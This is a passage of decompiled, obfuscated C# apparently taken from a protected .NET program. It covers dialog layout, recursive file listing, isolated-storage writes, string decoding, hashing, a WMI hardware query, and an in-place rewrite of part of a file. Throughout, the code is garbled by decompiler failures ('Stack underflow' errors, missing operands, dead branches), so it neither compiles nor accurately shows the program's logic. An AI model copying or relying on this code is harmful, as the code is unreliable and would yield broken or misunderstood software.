			_0003_0003._007E_0091_0005(P_0._0001, new Point(22, 98));
			_0004_0003._007E_0092_0005(P_0._0001, new Size(226, 16));
			_0090_0002._007E_0016_0005(P_0._0001, 13);
			global::_0011._007E_007F_0002(P_0._0001, global::_000E._0003._0001(107392699));
			_008B_0002._007E_000E_0005(P_0._0001, P_0._0006);
			_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)14);
			_0002_0003._007E_0090_0005(P_0._0001, (FlatStyle)3);
			_0005_0003._007E_0097_0005(P_0._0001, new Font(global::_000E._0003._0001(107392638), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
			_0003_0003._007E_0091_0005(P_0._0001, new Point(20, 124));
			_0004_0003._007E_0092_0005(P_0._0001, new Size(381, 16));
			global::_0011._007E_007F_0002(P_0._0001, _0018_0002._007F_0004(global::_000E._0003._0001(107392577), global::_000E._0003._0001(107392560)));
			_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)10);
			_0002_0003._007E_008F_0005(P_0._0001, (FlatStyle)3);
			_0004_0003._007E_0092_0005(P_0._0001, new Size(75, 24));
			_0003_0003._007E_0091_0005(P_0._0001, new Point(400 - global::_0001._007E_0012(P_0._0001), 205));
			_0090_0002._007E_0016_0005(P_0._0001, 4);
			global::_0011._007E_007F_0002(P_0._0001, global::_000E._0003._0001(107392515));
			_008B_0002._007E_000F_0005(P_0._0001, P_0._0003);
			_0001_0003._007E_008E_0005(P_0._0002, (AnchorStyles)10);
			_0002_0003._007E_008F_0005(P_0._0002, (FlatStyle)3);
			_0004_0003._007E_0092_0005(P_0._0002, new Size(105, 24));
			_0003_0003._007E_0091_0005(P_0._0002, new Point(global::_0001._007E_0013(P_0._0001) - global::_0001._007E_0012(P_0._0002) - 6, 205));
			_0090_0002._007E_0016_0005(P_0._0002, 3);
			global::_0011._007E_007F_0002(P_0._0002, global::_000E._0003._0001(107392530));
			_008B_0002._007E_000F_0005(P_0._0002, P_0._0002);
			_0001_0003._007E_008E_0005(P_0._0007, (AnchorStyles)10);
			_0002_0003._007E_008F_0005(P_0._0007, (FlatStyle)3);
			_0004_0003._007E_0092_0005(P_0._0007, new Size(64, 24));
			_0003_0003._007E_0091_0005(P_0._0007, new Point(global::_0001._007E_0013(P_0._0002) - global::_0001._007E_0012(P_0._0007) - 6, 205));
			_0090_0002._007E_0016_0005(P_0._0007, 14);
			global::_0011._007E_007F_0002(P_0._0007, global::_000E._0003._0001(107393017));
			_0084_0002._007E_0092_0004(P_0._0007, false);
			_008B_0002._007E_000F_0005(P_0._0007, P_0._000F);
			_0001_0003._007E_008E_0005(P_0._0002, (AnchorStyles)14);
			_0002_0003._007E_0090_0005(P_0._0002, (FlatStyle)3);
			_0003_0003._007E_0091_0005(P_0._0002, new Point(20, 140));
			_0004_0003._007E_0092_0005(P_0._0002, new Size(381, 55));
			global::_0011._007E_007F_0002(P_0._0002, _0018_0002._007F_0004(global::_000E._0003._0001(107393008), global::_000E._0003._0001(107392560)));
			_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)13);
			_0003_0003._007E_0091_0005(P_0._0001, new Point(20, 69));
			_0004_0003._007E_0092_0005(P_0._0001, new Size(381, 13));
			_0001_0003._007E_008E_0005(P_0._0003, (AnchorStyles)10);
			_0002_0003._007E_008F_0005(P_0._0003, (FlatStyle)3);
			_0004_0003._007E_0092_0005(P_0._0003, new Size(80, 24));
			while (true)
			{
				_0003_0003._007E_0091_0005(P_0._0003, new Point(400 - global::_0001._007E_0012(P_0._0003), 205));
				_0090_0002._007E_0016_0005(P_0._0003, 7);
				global::_0011._007E_007F_0002(P_0._0003, global::_000E._0003._0001(107392798));
				_008B_0002._007E_000F_0005(P_0._0003, P_0._0004);
				_0001_0003._007E_008E_0005(P_0._0004, (AnchorStyles)10);
				_0084_0002._007E_0093_0004(P_0._0004, false);
				_0002_0003._007E_008F_0005(P_0._0004, (FlatStyle)3);
				_0004_0003._007E_0092_0005(P_0._0004, new Size(105, 24));
				_0003_0003._007E_0091_0005(P_0._0004, new Point(global::_0001._007E_0013(P_0._0003) - global::_0001._007E_0012(P_0._0004) - 6, 205));
				_0090_0002._007E_0016_0005(P_0._0004, 6);
				global::_0011._007E_007F_0002(P_0._0004, global::_000E._0003._0001(107392785));
				while (true)
				{
					_008B_0002._007E_000F_0005(P_0._0004, P_0._0005);
					_0001_0003._007E_008E_0005(P_0._0005, (AnchorStyles)10);
					_0002_0003._007E_008F_0005(P_0._0005, (FlatStyle)3);
					_0003_0003._007E_0091_0005(P_0._0005, _0006_0003._007E_0098_0005(P_0._0004));
					_0004_0003._007E_0092_0005(P_0._0005, _0007_0003._007E_0099_0005(P_0._0004));
					_0090_0002._007E_0016_0005(P_0._0005, 5);
					global::_0011._007E_007F_0002(P_0._0005, global::_000E._0003._0001(107392236));
					_0084_0002._007E_0092_0004(P_0._0005, false);
					_008B_0002._007E_000F_0005(P_0._0005, P_0._000E);
					_0001_0003._007E_008E_0005(P_0._0006, (AnchorStyles)10);
					_0002_0003._007E_008F_0005(P_0._0006, (FlatStyle)3);
					_0003_0003._007E_0091_0005(P_0._0006, _0006_0003._007E_0098_0005(P_0._0004));
					_0004_0003._007E_0092_0005(P_0._0006, _0007_0003._007E_0099_0005(P_0._0004));
					if (8 == 0)
					{
						break;
					}
					_0090_0002._007E_0016_0005(P_0._0006, 5);
					global::_0011._007E_007F_0002(P_0._0006, global::_000E._0003._0001(107392227));
					_0084_0002._007E_0092_0004(P_0._0006, false);
					_008B_0002._007E_000F_0005(P_0._0006, P_0._0001);
					_0003_0003._007E_0091_0005(P_0._0001, new Point(87, 146));
					_0084_0002._007E_0092_0004(P_0._0001, false);
					_0008_0003._007E_009B_0005(P_0._0001, 24, 72, 368, 16);
					_0008_0003._007E_009B_0005(P_0._0002, 24, 96, 368, 16);
					_0008_0003._007E_009B_0005(P_0._0003, 24, 120, 368, 16);
					_0008_0003._007E_009B_0005(P_0._0004, 24, 144, 368, 16);
					_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)6);
					_0008_0003._007E_009B_0005(P_0._0001, 20, 444, 120, 32);
					_000F_0003._007E_009D_0005(_000E_0003._007E_009C_0005(P_0._0001), (Control[])(object)new Control[8]
					{
						(Control)P_0._0007,
						(Control)P_0._0001,
						(Control)P_0._0001,
						(Control)P_0._0001,
						(Control)P_0._0002,
						(Control)P_0._0002,
						(Control)P_0._0001,
						P_0._0001
					});
					_0004_0003._007E_0092_0005(P_0._0001, new Size(413, 240));
					_0090_0002._007E_0016_0005(P_0._0001, 0);
					_000F_0003._007E_009D_0005(_000E_0003._007E_009C_0005(P_0._0002), (Control[])(object)new Control[10]
					{
						(Control)P_0._0003,
						(Control)P_0._0004,
						(Control)P_0._0005,
						(Control)P_0._0006,
						P_0._0001,
						P_0._0002,
						P_0._0001,
						P_0._0002,
						P_0._0003,
						P_0._0004
					});
					_0004_0003._007E_0092_0005(P_0._0002, new Size(413, 240));
					_0090_0002._007E_0016_0005(P_0._0002, 2);
					_0084_0002._007E_0092_0004(P_0._0002, false);
					_0004_0003._007E_0093_0005(P_0, new Size(5, 13));
					_0004_0003._0094_0005(P_0, new Size(434, 488));
					_0084_0002._0094_0004(P_0, false);
					_000F_0003._007E_009D_0005(_000E_0003._009C_0005(P_0), (Control[])(object)new Control[3]
					{
						P_0._0001,
						(Control)P_0._0001,
						(Control)P_0._0002
					});
					_0010_0003._009E_0005(P_0, (FormBorderStyle)1);
					_0084_0002._0095_0004(P_0, false);
					_0084_0002._0096_0004(P_0, false);
					if (6u != 0)
					{
						_0084_0002._0097_0004(P_0, false);
						_0011_0003._009F_0005(P_0, (FormStartPosition)1);
						global::_0011._007E_007F_0002(P_0, global::_000E._0003._0001(107395030));
						if (global::_0001._007E_0001(global::_0007._007E_008F(P_0)) == 0)
						{
							global::_0011._007E_007F_0002(P_0, global::_000E._0003._0001(107392242));
						}
						try
						{
							_0084_0002._0098_0004(P_0, true);
						}
						catch
						{
						}
						_0084_0002._007E_0099_0004(P_0._0001, false);
						_0084_0002._007E_0099_0004(P_0._0002, false);
						_0084_0002._0099_0004(P_0, false);
						global::_000F._007E_0008_0002(P_0._0005);
						global::_000F._007E_0008_0002(P_0._0006);
						_0004_0003._0095_0005(P_0, new Size(419, 264));
						_0012_0003._007E_0001_0006(P_0._0002, (DockStyle)5);
						_0012_0003._007E_0001_0006(P_0._0001, (DockStyle)5);
						return;
					}
				}
			}
		}

		static List<string> _0001(string P_0, string P_1)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 1
			List<string> list = default(List<string>);
			string[] array = default(string[]);
			int i = default(int);
			string text = default(string);
			try
			{
				if (0 == 0)
				{
					new List<string>();
					list = (List<string>)/*Error near IL_006f: Stack underflow*/;
					try
					{
						Directory.GetFiles((string)/*Error near IL_0049: Stack underflow*/, (string)/*Error near IL_0049: Stack underflow*/, SearchOption.TopDirectoryOnly);
						((List<string>)/*Error near IL_0050: Stack underflow*/).AddRange((IEnumerable<string>)/*Error near IL_0050: Stack underflow*/);
						Directory.GetDirectories((string)/*Error near IL_005a: Stack underflow*/);
						array = (string[])/*Error near IL_001a: Stack underflow*/;
						for (i = 0; i < array.Length; i++)
						{
							text = array[i];
							list.AddRange(_0011._0001(text, P_1));
						}
					}
					catch (Exception)
					{
					}
				}
				return list;
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)list, (object)array, (object)i, (object)text, (object)P_0, (object)P_1);
				throw;
			}
		}

		static IsolatedStorageFileStream _0001(FileAccess P_0, FileMode P_1, string P_2)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			try
			{
				new IsolatedStorageFileStream(share: FileShare.None, isf: global::_0002._000E._0001, path: (string)/*Error near IL_0020: Stack underflow*/, mode: (FileMode)/*Error near IL_0020: Stack underflow*/, access: (FileAccess)/*Error near IL_0020: Stack underflow*/);
				IsolatedStorageFileStream isolatedStorageFileStream = (IsolatedStorageFileStream)/*Error near IL_0023: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_2, (object)P_1, (object)P_0);
				throw;
			}
			return (IsolatedStorageFileStream)/*Error near IL_003c: Stack underflow*/;
		}

		unsafe static void _0001(global::_0008._0004._0007._0001 P_0)
		{
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0104: Incompatible stack heights: 0 vs 1
			//IL_010a: Incompatible stack heights: 0 vs 1
			//IL_0116: Incompatible stack heights: 0 vs 1
			//IL_011c: Incompatible stack heights: 0 vs 1
			//IL_0122: Incompatible stack heights: 0 vs 1
			//IL_0128: Incompatible stack heights: 0 vs 1
			//IL_012e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[16];
			int[] array = default(int[]);
			try
			{
				_ = ((global::_0008._0004._0007._0001)/*Error near IL_0014: Stack underflow*/)._0001.Length;
				array = new int[((global::_0008._0004._0007._0001)/*Error near IL_0021: Stack underflow*/)._0003];
				*(int*)(nint)/*Error near IL_0032: Stack underflow*/ = 0;
				short[] array2 = new short[((global::_0008._0004._0007._0001)/*Error near IL_0041: Stack underflow*/)._0001.Length];
				((global::_0008._0004._0007._0001)/*Error near IL_004d: Stack underflow*/)._0002 = array2;
				*(int*)(nint)(/*Error near IL_0054: Stack underflow*/ + 4) = 0;
				while (*(int*)((byte*)ptr + 4) < P_0._0003)
				{
					int num = *(int*)((byte*)ptr + 4);
					int num2 = *(int*)ptr;
					((int[])/*Error near IL_0064: Stack underflow*/)[num] = num2;
					*(int*)ptr += P_0._0001[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
					(*(int*)((byte*)ptr + 4))++;
				}
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < P_0._0002)
				{
					*(int*)((byte*)ptr + 12) = P_0._0001[*(int*)((byte*)ptr + 8)];
					if (*(int*)((byte*)ptr + 12) > 0)
					{
						P_0._0002[*(int*)((byte*)ptr + 8)] = _0011._0001(array[*(int*)((byte*)ptr + 12) - 1]);
						array[*(int*)((byte*)ptr + 12) - 1] += 1 << 16 - *(int*)((byte*)ptr + 12);
					}
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0008._0004._000E P_0)
		{
			//IL_0034: Unknown result type (might be due to invalid IL or missing references)
			//IL_003a: Expected I4, but got Unknown
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_0099: Incompatible stack heights: 0 vs 1
			//IL_009f: Incompatible stack heights: 0 vs 2
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 1
			//IL_00bd: Incompatible stack heights: 0 vs 1
			//IL_00c3: Incompatible stack heights: 0 vs 1
			int num2 = default(int);
			try
			{
				int num = ((global::_0008._0004._000E)/*Error near IL_000a: Stack underflow*/)._0003;
				while (true)
				{
					if (false)
					{
						goto IL_0055;
					}
					if (num > 0)
					{
						_ = ((global::_0008._0004._000E)/*Error near IL_001a: Stack underflow*/)._0001;
						num2 = ((global::_0008._0004._000E)/*Error near IL_0029: Stack underflow*/)._0002;
						_003F val = /*Error near IL_0035: Stack underflow*/+ 1;
						((global::_0008._0004._000E)/*Error near IL_003a: Stack underflow*/)._0002 = (int)val;
						uint num3 = ((global::_0008._0004._000E)/*Error near IL_0049: Stack underflow*/)._0001;
						((sbyte[])/*Error near IL_004b: Stack underflow*/)[/*Error near IL_004b: Stack underflow*/] = (sbyte)(byte)num3;
						goto IL_0050;
					}
					goto IL_007c;
					IL_007c:
					P_0._0001 = 0u;
					if (-1 == 0)
					{
						goto IL_0050;
					}
					P_0._0003 = 0;
					if (0 == 0)
					{
						break;
					}
					goto IL_005b;
					IL_0050:
					num = ((global::_0008._0004._000E)/*Error near IL_0055: Stack underflow*/)._0003;
					goto IL_0055;
					IL_0055:
					if (7 == 0)
					{
						continue;
					}
					if (num > 8)
					{
						goto IL_005b;
					}
					goto IL_007c;
					IL_005b:
					byte[] array = P_0._0001;
					num2 = P_0._0002++;
					array[num2] = (byte)(P_0._0001 >> 8);
					goto IL_007c;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num2, (object)P_0);
				throw;
			}
		}

		static bool _0001(global::_0008._0004._000E P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					bool flag = ((global::_0008._0004._000E)/*Error near IL_0007: Stack underflow*/)._0002 == 0;
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (byte)/*Error near IL_0022: Stack underflow*/ != 0;
		}

		static void _0001(uint P_0)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			global::_0002._0010 obj = default(global::_0002._0010);
			try
			{
				if (4u != 0)
				{
					new global::_0002._0010();
					obj = (global::_0002._0010)/*Error near IL_0022: Stack underflow*/;
					goto IL_000c;
				}
				goto IL_0015;
				IL_000c:
				if (0 == 0)
				{
					_0011._0001((global::_0003._0008)/*Error near IL_002f: Stack underflow*/, (uint)/*Error near IL_002f: Stack underflow*/);
				}
				goto IL_0011;
				IL_0015:
				if (0 == 0)
				{
					return;
				}
				goto IL_0011;
				IL_0011:
				if (false)
				{
					goto IL_000c;
				}
				goto IL_0015;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj, (object)P_0);
				throw;
			}
		}

		static void _0001(string P_0, global::_0006._0001 P_1)
		{
			//IL_009c: Incompatible stack heights: 0 vs 3
			//IL_00a3: Incompatible stack heights: 0 vs 1
			//IL_00dc: Incompatible stack heights: 0 vs 1
			//IL_00e6: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			//IL_0102: Incompatible stack heights: 0 vs 1
			Stream stream = default(Stream);
			byte[] array = default(byte[]);
			BinaryReader binaryReader = default(BinaryReader);
			BinaryWriter binaryWriter = default(BinaryWriter);
			try
			{
				new FileStream((string)/*Error near IL_00e6: Stack underflow*/, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
				if (4u != 0)
				{
					stream = (Stream)/*Error near IL_00ec: Stack underflow*/;
				}
				array = new byte[1024];
				new BinaryReader((Stream)/*Error near IL_0102: Stack underflow*/);
				binaryReader = (BinaryReader)/*Error near IL_0108: Stack underflow*/;
				try
				{
					binaryWriter = new BinaryWriter(stream);
					try
					{
						do
						{
							_ = _0014_0003._007E_0004_0006;
							_ = _0013_0003._007E_0002_0006;
							/*Error near IL_00a3: Stack underflow*/((object)/*Error near IL_00a3: Stack underflow*/);
							/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/, 0L);
							array = _0015_0003._007E_0005_0006(binaryReader, 1024);
							_0014_0003._007E_0004_0006(_0013_0003._007E_0003_0006(binaryWriter), 0L);
							array = _0011._0001(_0011._0001(P_1, P_1._0001()), array, P_1);
						}
						while (false);
						_0016_0003._007E_0006_0006(binaryWriter, array);
					}
					finally
					{
						if (binaryWriter != null)
						{
							global::_000F._007E_0099(binaryWriter);
						}
					}
				}
				finally
				{
					if (binaryReader != null)
					{
						global::_000F._007E_0099(binaryReader);
					}
				}
				global::_000F._007E_009E(stream);
				global::_000F._007E_000E_0002(stream);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)stream, (object)array, (object)binaryReader, (object)binaryWriter, (object)P_1, (object)P_0);
				throw;
			}
		}

		[DllImport("gdi32.dll", EntryPoint = "SelectObject")]
		static extern IntPtr _0001(IntPtr P_0, IntPtr P_1);

		static int _0001(global::_0008._0004._0002 P_0)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 2
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0033: Expected I4, but got Unknown
			//IL_0041: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((global::_0008._0004._0002)/*Error near IL_0007: Stack underflow*/)._0002;
				int num = ((global::_0008._0004._0002)/*Error near IL_000e: Stack underflow*/)._0001;
				_003F val = /*Error near IL_000f: Stack underflow*/- num;
				do
				{
					if (-1 == 0)
					{
						continue;
					}
					int num2 = ((global::_0008._0004._0002)/*Error near IL_0019: Stack underflow*/)._0003;
					do
					{
						if (uint.MaxValue != 0)
						{
							num2 >>= 3;
						}
					}
					while (2 == 0);
					val = /*Error near IL_0022: Stack underflow*/+ num2;
				}
				while (1 == 0);
				int num3 = (int)val;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_0040: Stack underflow*/;
		}

		static string _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				_008E_0002._0012_0005();
				string text = (string)/*Error near IL_0013: Stack underflow*/;
			}
			catch
			{
				if (0 == 0)
				{
					string text = global::_000E._0003._0001(107392221);
				}
			}
			return (string)/*Error near IL_0029: Stack underflow*/;
		}

		unsafe static uint _0001(string P_0)
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Expected I4, but got Unknown
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			try
			{
				if ((int)/*Error near IL_000e: Stack underflow*/ != 0)
				{
					*(int*)(nint)/*Error near IL_0016: Stack underflow*/ = -2128831035;
					*(int*)(nint)(/*Error near IL_001a: Stack underflow*/ + 4) = 0;
					while (*(int*)((byte*)ptr + 4) < global::_0001._007E_0001(P_0))
					{
						_ = global::_0003._007E_0018;
						int num = *(int*)(nint)(/*Error near IL_002b: Stack underflow*/ + 4);
						/*Error near IL_0073: Stack underflow*/((object)/*Error near IL_0073: Stack underflow*/, num);
						int num2 = *(int*)(nint)/*Error near IL_0031: Stack underflow*/;
						_003F val = /*Error near IL_0032: Stack underflow*/^ num2;
						*(int*)(nint)/*Error near IL_0039: Stack underflow*/ = val * 16777619;
						(*(int*)((byte*)ptr + 4))++;
					}
				}
				*(int*)((byte*)ptr + 8) = *(int*)ptr;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(uint*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)P_0);
				throw;
			}
			return *(uint*)((byte*)ptr + 8);
		}

		static Type _0001(global::_0004._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0004._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static string _0001(string P_0)
		{
			//IL_0126: Incompatible stack heights: 0 vs 3
			//IL_0130: Incompatible stack heights: 0 vs 1
			//IL_013c: Incompatible stack heights: 0 vs 4
			//IL_0146: Incompatible stack heights: 0 vs 1
			//IL_0150: Incompatible stack heights: 0 vs 1
			//IL_015a: Incompatible stack heights: 0 vs 1
			//IL_0166: Incompatible stack heights: 0 vs 2
			byte[] array = default(byte[]);
			string text = default(string);
			Guid guid = default(Guid);
			string text2 = default(string);
			string text4 = default(string);
			IsolatedStorageFileStream isolatedStorageFileStream = default(IsolatedStorageFileStream);
			try
			{
				_ = _0087_0002._007E_0004_0005;
				_ = global::_0002._000E._0001;
				/*Error near IL_0130: Stack underflow*/((object)/*Error near IL_0130: Stack underflow*/, (string)/*Error near IL_0130: Stack underflow*/);
				array = (byte[])/*Error near IL_0136: Stack underflow*/;
				_ = _0017_0003._007E_0007_0006;
				_ = _0017_0003._007E_0007_0006;
				_ = global::_0010._001B_0002;
				/*Error near IL_0146: Stack underflow*/((byte[])/*Error near IL_0146: Stack underflow*/);
				/*Error near IL_0150: Stack underflow*/((object)/*Error near IL_0150: Stack underflow*/, '\\', '@');
				/*Error near IL_015a: Stack underflow*/((object)/*Error near IL_015a: Stack underflow*/, '/', '#');
				text = (string)/*Error near IL_0160: Stack underflow*/;
				_ = global::_0001._007E_0001;
				if (/*Error near IL_0058: Stack underflow*/((object)/*Error near IL_0058: Stack underflow*/) > 50)
				{
					guid = new Guid(_0018_0003._007E_0008_0006(global::_0002._000E._0001, array));
					text2 = _001C._007E_009B_0002(guid.ToString(), 0, 18);
					global::_0004 obj = global::_0004._0019;
					string text3 = global::_0004._001A(global::_0002._000E._0003, text2);
					text = text3 + global::_000E._0003._0001(107392216);
					text4 = obj(text3, global::_000E._0003._0001(107396618));
					isolatedStorageFileStream = null;
					try
					{
						isolatedStorageFileStream = _0011._0001(FileAccess.Write, FileMode.CreateNew, text4);
						_0088_0002._007E_0005_0005(isolatedStorageFileStream, array, 0, array.Length);
					}
					catch (IOException)
					{
					}
					finally
					{
						if (isolatedStorageFileStream != null)
						{
							global::_000F._007E_009E(isolatedStorageFileStream);
						}
					}
				}
				else
				{
					text = global::_0004._001A(global::_0002._000E._0003, global::_0004._0019(text, global::_000E._0003._0001(107392216)));
				}
				return text;
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)array, (object)text, (object)text2, (object)text4, (object)isolatedStorageFileStream, (object)guid, (object)P_0);
				throw;
			}
		}

		static string _0001(int P_0)
		{
			//IL_011d: Incompatible stack heights: 0 vs 1
			//IL_0129: Incompatible stack heights: 0 vs 2
			//IL_013b: Incompatible stack heights: 0 vs 1
			//IL_0147: Incompatible stack heights: 0 vs 1
			int num = default(int);
			int num3 = default(int);
			byte[] array = default(byte[]);
			int num4 = default(int);
			string text = default(string);
			string text2 = default(string);
			try
			{
				num = (int)/*Error near IL_0123: Stack underflow*/;
				_ = global::_000E._0003._0001;
				num++;
				int num2 = ((byte[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/];
				string result;
				while (true)
				{
					if (5 == 0)
					{
						goto IL_0026;
					}
					num3 = num2;
					goto IL_0134;
					IL_00a4:
					try
					{
						do
						{
							array = _0019_0003._000E_0006(_0086._007E_0007_0003(_0013._008F_0002(), global::_000E._0003._0001, num, num4));
							text = global::_0006._001E(_0086._007E_0007_0003(_0013._008F_0002(), array, 0, array.Length));
							if (global::_000E._0003._0001)
							{
								_0011._0001(P_0, text);
							}
						}
						while (-1 == 0);
						text2 = text;
					}
					catch
					{
						do
						{
							text2 = null;
						}
						while (4 == 0);
					}
					result = text2;
					if (false)
					{
						goto IL_0040;
					}
					break;
					IL_0026:
					if ((num2 & 0x80) == 0 && uint.MaxValue != 0)
					{
						num4 = (int)/*Error near IL_0141: Stack underflow*/;
						goto IL_0040;
					}
					if ((num3 & 0x40) == 0)
					{
						num4 = ((num3 & 0x3F) << 8) + global::_000E._0003._0001[num++];
					}
					else
					{
						num2 = (num3 & 0x1F) << 24;
						if (3 == 0)
						{
							continue;
						}
						num4 = num2 + (global::_000E._0003._0001[num++] << 16) + (global::_000E._0003._0001[num++] << 8) + global::_000E._0003._0001[num++];
					}
					goto IL_00a4;
					IL_0134:
					num2 = num3;
					goto IL_0026;
					IL_0040:
					if ((int)/*Error near IL_0042: Stack underflow*/ != 0)
					{
						goto IL_00a4;
					}
					if (false)
					{
						goto IL_0134;
					}
					return string.Empty;
				}
				return result;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num4, (object)num, (object)num3, (object)array, (object)text, (object)text2, (object)P_0);
				throw;
			}
		}

		static string _0001(global::_0002._0006._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0002._0006._0003)/*Error near IL_0007: Stack underflow*/)._0003;
		}

		static string _0001()
		{
			//IL_0056: Invalid comparison between Unknown and I4
			//IL_006f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0075: Expected O, but got Unknown
			//IL_01fa: Incompatible stack heights: 0 vs 1
			//IL_020a: Incompatible stack heights: 0 vs 3
			//IL_0214: Incompatible stack heights: 0 vs 1
			//IL_0219: Unknown result type (might be due to invalid IL or missing references)
			//IL_021e: Incompatible stack heights: 0 vs 1
			//IL_0228: Incompatible stack heights: 0 vs 1
			//IL_0232: Incompatible stack heights: 0 vs 3
			//IL_023c: Incompatible stack heights: 0 vs 1
			//IL_0246: Incompatible stack heights: 0 vs 1
			string text = default(string);
			bool flag = default(bool);
			ManagementObjectEnumerator val = default(ManagementObjectEnumerator);
			ManagementObject val2 = default(ManagementObject);
			try
			{
				global::_000E._0003._0001(107396732);
				text = (string)/*Error near IL_0200: Stack underflow*/;
				_ = _001B_0003._007E_0010_0006;
				_ = _001A_0003._007E_000F_0006;
				global::_000E._0003._0001(107392175);
				global::_000E._0003._0001(107392190);
				new ManagementObjectSearcher((string)/*Error near IL_021e: Stack underflow*/, (string)/*Error near IL_021e: Stack underflow*/);
				/*Error near IL_0228: Stack underflow*/((object)/*Error near IL_0228: Stack underflow*/);
				_ = _0015._0094_0002;
				_ = global::_0006._001C;
				global::_000E._0003._0001(107392109);
				/*Error near IL_023c: Stack underflow*/((string)/*Error near IL_023c: Stack underflow*/);
				/*Error near IL_0246: Stack underflow*/((string)/*Error near IL_0246: Stack underflow*/);
				flag = (int)/*Error near IL_0058: Stack underflow*/ == 0;
				val = /*Error near IL_005e: Stack underflow*/((object)/*Error near IL_005e: Stack underflow*/);
				try
				{
					if (_008D._007E_001F_0003(val))
					{
						val2 = (ManagementObject)_001C_0003._007E_0011_0006(val);
						text = _0019._0098_0002(global::_0007._007E_0086(_0005_0002._007E_000E_0004(_001E_0003._007E_0013_0006(_001D_0003._007E_0012_0006(val2), global::_000E._0003._0001(107392076)))), global::_0006._001C(global::_000E._0003._0001(107392109)), global::_0007._007E_0086(_0005_0002._007E_000E_0004(_001E_0003._007E_0013_0006(_001D_0003._007E_0012_0006(val2), global::_000E._0003._0001(107392095)))));
					}
				}
				finally
				{
					do
					{
						if (val != null)
						{
							global::_000F._007E_0099(val);
						}
					}
					while (false);
				}
				_0012._007E_008C_0002(text, global::_000E._0003._0001(107396328), global::_000E._0003._0001(107396732));
				_0012._007E_008C_0002(text, global::_000E._0003._0001(107392082), global::_000E._0003._0001(107396732));
				_0012._007E_008C_0002(text, global::_000E._0003._0001(107392037), global::_000E._0003._0001(107396732));
				text += (flag ? global::_000E._0003._0001(107392051) : global::_000E._0003._0001(107392056));
